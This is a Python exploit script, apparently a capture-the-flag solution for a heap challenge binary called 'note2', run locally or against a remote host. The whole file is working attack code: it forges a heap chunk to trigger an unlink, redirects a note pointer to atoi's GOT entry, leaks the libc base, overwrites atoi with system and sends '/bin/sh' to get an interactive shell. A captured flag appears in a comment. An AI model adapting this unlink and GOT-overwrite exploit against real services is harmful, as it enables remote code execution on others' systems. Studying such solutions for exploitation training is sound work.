#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwnxx import *

elf = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if len(sys.argv) == 1:
	DEBUG = 1
else :
	DEBUG = 0

if DEBUG:
	# context(log_level='debug')
	# env={'LD_PRELOAD':'libc.so.6'}
	io = process("./note2")
	# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	# io = process("./vul32",env=env)
	# gdb.attach(io,'break main')
	# gdb.attach(io,'break *0x400781')

else:
    io = remote(sys.argv[1], int(sys.argv[2]))
# 1.New note
# 2.Show  note
# 3.Edit note
# 4.Delete note
# 5.Quit
# noption
def newnote(length, content):
    io.recvuntil('option--->>')
    io.sendline('1')
    io.recvuntil('(less than 128)')
    io.sendline(str(length))
    io.recvuntil('content:')
    # gdb.attach(io,'b*0x400c60')
    io.sendline(content)
    # pause()


def shownote(id):
    io.recvuntil('option--->>')
    io.sendline('2')
    io.recvuntil("of the note:")
    io.sendline(str(id))

def editnote(id, chioce,content):
    io.recvuntil('option--->>')
    io.sendline('3')
    io.recvuntil("of the note:")
    io.sendline(str(id))
    io.recvuntil('[1.overwrite/2.append]')
    io.sendline(str(chioce))
    io.sendline(content)

def deletenote(id):
    io.recvuntil('option--->>')
    io.sendline('4')
    io.recvuntil("of the note:")
    io.sendline(str(id))

def pwn():
    io.recvuntil("name:")
    io.sendline("xxxx")
    io.recvuntil("address:")
    io.sendline("yyyy")
    # chunk0: a fake chunk
    ptr = 0x0000000000602120
    fakefd = ptr - 0x18
    fakebk = ptr - 0x10
    content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
    # content = p64(fakefd) + p64(fakebk)
    newnote(128, content)
    # chunk1: a zero size chunk produce overwrite
    newnote(0, 'a' * 8)
    # chunk2: a chunk to be overwrited and freed
    newnote(0x80, 'b' * 16)

    # edit the chunk1 to overwrite the chunk2
    deletenote(1)
    content = 'a' * 16 + p64(0xa0) + p64(0x90)
    newnote(0, content)
    # delete note 2 to trigger the unlink
    # after unlink, ptr[0] = ptr - 0x18
    deletenote(2)

    # overwrite the chunk0(which is ptr[0]) with got atoi
    atoi_got = elf.got['atoi']
    content = 'a' * 0x18 + p64(atoi_got)
    editnote(0, 1, content)
    # get the aoti addr
    shownote(0)

    io.recvuntil('is ')
    atoi_addr = io.recvuntil('\n', drop=True)
    print atoi_addr
    atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
    print 'leak atoi addr: ' + hex(atoi_addr)

    # get system addr
    atoi_offest = libc.symbols['atoi']
    libcbase = atoi_addr - atoi_offest
    system_offest = libc.symbols['system']
    system_addr = libcbase + system_offest

    print 'leak system addr: ', hex(system_addr)

    # overwrite the atoi got with systemaddr
    content = p64(system_addr)
    editnote(0, 1, content)

    # get shell
    io.recvuntil('option--->>')
    io.sendline('/bin/sh')
    io.interactive()


    io.interactive()


if __name__ == '__main__':
	pwn()
    # flag{Ok_yOu_get@#$_it!}

